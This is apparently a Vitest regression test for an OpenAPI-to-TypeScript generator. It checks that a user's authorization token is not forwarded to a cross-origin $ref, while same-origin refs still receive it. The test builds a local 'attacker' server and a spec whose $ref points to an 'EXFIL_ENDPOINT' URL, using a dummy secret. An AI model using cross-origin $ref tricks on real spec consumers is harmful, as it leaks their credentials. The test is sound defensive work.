import * as fs from "node:fs/promises";
import { createServer, type Server } from "node:http";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, describe, expect, test } from "vitest";
import { generateApi } from "../src/index.js";

interface AttackerHit {
  url?: string;
  authorization?: string;
}

describe("ResolvedSwaggerSchema authorization token forwarding", () => {
  let specServer: Server | null = null;
  let attackerServer: Server | null = null;
  let tmpRoot = "";
  let specPort = 0;
  let attackerPort = 0;
  let attackerHits: AttackerHit[] = [];

  const SECRET = "Bearer USER_GITHUB_PAT_super_secret_xyz123";

  async function startServers(includeCrossOriginRef: boolean) {
    attackerHits = [];

    attackerServer = createServer((req, res) => {
      attackerHits.push({
        url: req.url,
        authorization: req.headers.authorization,
      });
      res.writeHead(200, { "content-type": "application/json" });
      res.end('{"intercepted":"yes"}');
    });

    specServer = createServer((_req, res) => {
      const spec = {
        openapi: "3.0.0",
        info: { title: "auth-token-test", version: "1.0.0" },
        paths: {
          "/p": {
            get: {
              operationId: "p",
              responses: {
                "200": {
                  description: "OK",
                  content: {
                    "application/json": {
                      schema: includeCrossOriginRef
                        ? {
                            $ref: `http://127.0.0.1:${attackerPort}/EXFIL_ENDPOINT/data.json`,
                          }
                        : {
                            type: "object",
                            properties: { ok: { type: "boolean" } },
                          },
                    },
                  },
                },
              },
            },
          },
        },
      };

      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(spec));
    });

    await new Promise<void>((resolve) => {
      attackerServer?.listen(0, "127.0.0.1", () => resolve());
    });
    attackerPort =
      (attackerServer?.address() as { port: number } | null)?.port ?? 0;

    await new Promise<void>((resolve) => {
      specServer?.listen(0, "127.0.0.1", () => resolve());
    });
    specPort = (specServer?.address() as { port: number } | null)?.port ?? 0;
  }

  async function stopServers() {
    await Promise.all([
      new Promise<void>((resolve) => {
        if (!specServer) {
          resolve();
          return;
        }
        specServer.close(() => resolve());
      }),
      new Promise<void>((resolve) => {
        if (!attackerServer) {
          resolve();
          return;
        }
        attackerServer.close(() => resolve());
      }),
    ]);
    specServer = null;
    attackerServer = null;
  }

  afterEach(async () => {
    await stopServers();
    if (tmpRoot) {
      await fs.rm(tmpRoot, { recursive: true, force: true });
      tmpRoot = "";
    }
  });

  test("does not forward authorizationToken to cross-origin $ref URLs", async () => {
    tmpRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "swagger-typescript-api-auth-token-leak-"),
    );

    await startServers(true);

    await generateApi({
      output: tmpRoot,
      url: `http://127.0.0.1:${specPort}/spec.json`,
      authorizationToken: SECRET,
      httpClientType: "fetch",
      silent: true,
    });

    expect(attackerHits).toHaveLength(1);
    expect(attackerHits[0]?.authorization).toBeUndefined();
  });

  test("forwards authorizationToken to same-origin $ref URLs", async () => {
    tmpRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "swagger-typescript-api-auth-token-same-origin-"),
    );

    const sameOriginHits: AttackerHit[] = [];

    specServer = createServer((req, res) => {
      sameOriginHits.push({
        url: req.url,
        authorization: req.headers.authorization,
      });

      if (req.url === "/components/data.json") {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            type: "object",
            properties: { ok: { type: "boolean" } },
          }),
        );
        return;
      }

      const spec = {
        openapi: "3.0.0",
        info: { title: "auth-token-same-origin", version: "1.0.0" },
        paths: {
          "/p": {
            get: {
              operationId: "p",
              responses: {
                "200": {
                  description: "OK",
                  content: {
                    "application/json": {
                      schema: {
                        $ref: "/components/data.json",
                      },
                    },
                  },
                },
              },
            },
          },
        },
      };

      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(spec));
    });

    await new Promise<void>((resolve) => {
      specServer?.listen(0, "127.0.0.1", () => resolve());
    });
    specPort = (specServer?.address() as { port: number } | null)?.port ?? 0;

    await generateApi({
      output: tmpRoot,
      url: `http://127.0.0.1:${specPort}/spec.json`,
      authorizationToken: SECRET,
      httpClientType: "fetch",
      silent: true,
    });

    const refHits = sameOriginHits.filter(
      (hit) => hit.url === "/components/data.json",
    );

    expect(refHits.some((hit) => hit.authorization === SECRET)).toBe(true);
  });

  test("does not contact attacker server when spec has no cross-origin $ref", async () => {
    tmpRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "swagger-typescript-api-auth-token-control-"),
    );

    await startServers(false);

    await generateApi({
      output: tmpRoot,
      url: `http://127.0.0.1:${specPort}/spec.json`,
      authorizationToken: SECRET,
      httpClientType: "fetch",
      silent: true,
    });

    expect(attackerHits).toHaveLength(0);
  });
});
